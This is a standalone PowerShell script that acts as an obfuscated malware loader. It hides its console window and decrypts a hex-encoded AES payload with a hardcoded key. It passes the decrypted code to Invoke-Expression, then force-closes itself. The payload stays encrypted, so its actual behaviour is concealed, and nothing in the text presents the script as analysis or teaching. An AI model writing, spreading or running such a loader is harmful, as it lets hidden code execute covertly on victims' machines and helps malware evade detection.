# HIDE PowerShell Window Immediately
$hwnd = (Get-Process -Id $pid).MainWindowHandle
if ($hwnd -ne 0) {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class WinUtil {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@
    [WinUtil]::ShowWindow($hwnd, 0)  # 0 = Hide window
}

# AES Decryption Function
function Decrypt-Payload($hexString, $keyHex) {
    function ConvertFrom-Hex($hexString) {
        return -split ($hexString -replace '..', '0x$& ')
    }

    $ciphertextBytes = ConvertFrom-Hex $hexString
    $keyBytes = ConvertFrom-Hex $keyHex
    $ivBytes = New-Object byte[] 16

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $keyBytes
    $aes.IV = $ivBytes

    $decryptor = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($ciphertextBytes, 0, $ciphertextBytes.Length)
    $decryptor.Dispose()

    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).TrimEnd([char]16)
}

# AES Key
$keyHex = "17d0b77ae632bd1e2b8210b47deb38fb"

# Encrypted Payload
$encryptedHex = "9559530cc7ccb0e7f42c9979ab38a5ed6c9f5195a357c52f9b3e6b10466821d8d3b463926583ed8a3e8ce287c8ffdc95e15b404ae2730f5458e2e958ffdbfd4dbb7434589116faae02d5c6465544358553940132bcc6a9676506d8a8431e7ab21aba05a1ecb2879abf5eb1dd78ffd5ae1aa2bbbfc8e6cc17cc740c68bd19c73b2080d0e9430b415f6d27475e9064c3d2b84d88d6bc03b0912b11cfde6817a82cd64fc089d8bd69b8ffc7dab0226c3a6950e8e294cd3ee6fd1420998ff82726e2f264387c6cb63c35bb46430980bff4f1d7a31452a13d523e1419cbe641d2682f85086b4b042165f0e24e24d5de502ca8cbf837050d94e20bede3d154512027ed"

# Decrypt and execute
$decryptedPayload = Decrypt-Payload $encryptedHex $keyHex
Invoke-Expression $decryptedPayload

# CLOSE PowerShell Window After Execution
Start-Sleep -Seconds 2
Stop-Process -Id $pid -Force
